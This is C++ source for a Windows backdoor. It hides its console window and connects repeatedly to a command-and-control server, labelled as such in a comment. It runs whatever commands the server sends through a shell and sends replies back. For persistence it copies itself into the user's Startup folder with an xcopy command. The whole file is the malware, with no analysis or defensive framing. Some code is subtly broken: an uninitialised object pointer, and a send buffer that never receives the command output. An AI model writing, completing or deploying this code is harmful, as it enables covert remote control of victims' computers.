#include <cstdio>
#include <chrono>
#include <thread>
#include <string>
#include <cstdlib>
#include <unistd.h>
#include <tchar.h>
#include <locale.h>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <filesystem>
#define MAX 8192

class client{
private:
    /* cnc server ip address */
    const char *server_ip_addr = "127.0.0.1";
    int port_number;

    WSADATA wsa_data;
    HWND window;

    int dst_socket;

    char send_buf[MAX];
    char recv_buf[MAX];

    char p_w_d[MAX];
public:
    client(): port_number(1919) {
        AllocConsole();
        window = FindWindowA("test", NULL);
        ShowWindow(window, 0);
    }

    void virii();
};

void client::virii() {
    if (WSAStartup(MAKEWORD(2, 0), &wsa_data) != 0) {
        return;
    }

    struct sockaddr_in dst_addr;
    memset(&dst_addr, 0, sizeof(dst_addr));
    dst_addr.sin_port = htons(port_number);
    dst_addr.sin_family = AF_INET;

    inet_pton(dst_addr.sin_family, server_ip_addr, &dst_addr.sin_addr.s_addr);

    dst_socket = socket(AF_INET, SOCK_STREAM, 0);

    while (1) {
        if (connect(dst_socket, (struct sockaddr *) &dst_addr, sizeof(dst_addr))) {
            std::this_thread::sleep_for(std::chrono::minutes(3));
            continue;
        }

        while (1) {
            recv(dst_socket, recv_buf, sizeof(recv_buf), 0);
            recv_buf[strcspn(recv_buf, "\r\n")] = 0;

            if (!strcmp(recv_buf, "exit")) {
                break;
            }
            else if (!strncmp("cd ", recv_buf, 3)) {
                for (size_t i = 0; i < strlen(recv_buf); i++) {
                    p_w_d[i] = recv_buf[i+3];
                }
                chdir(p_w_d);
            }
            else {
                FILE *fp;
                if ((fp = _popen(recv_buf, "r")) == NULL) {
                    perror("can not exec commad");
                }
                while (!feof(fp)) {
                    fgets(recv_buf, sizeof(recv_buf), fp);
                }
                (void)_pclose(fp);
            }

            send(dst_socket, send_buf, sizeof(send_buf), 0);
        }
    }

    closesocket(dst_socket);

    WSACleanup();
}

int main(int argc, char **argv) {
    client* client_virii;

    HANDLE hMutex = CreateMutex(NULL, FALSE, _T("test"));
    if (GetLastError() == ERROR_ALREADY_EXISTS || hMutex == NULL) return 1;

    TCHAR user[1024];
    DWORD dwUserSize;

    char buf[256];
    strcpy(buf, argv[0]);
    std::string str = buf;
    if (str.find(".exe") == std::string::npos) {
        str += ".exe";
    }
    std::string startup_directory = "\"%HOMEDRIVE%%HOMEPATH%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    std::string dir_place_worm = startup_directory + "\\" + str;
    std::string cmd_copy_worm_startup = "xcopy \".\\" + str + "\" " + dir_place_worm + "*\" /Y";
    const char *cmd_copy_worm_startup_p = cmd_copy_worm_startup.c_str();
    system(cmd_copy_worm_startup_p);

    std::thread th(client::virii, client_virii);
    th.join();

    return 0;
}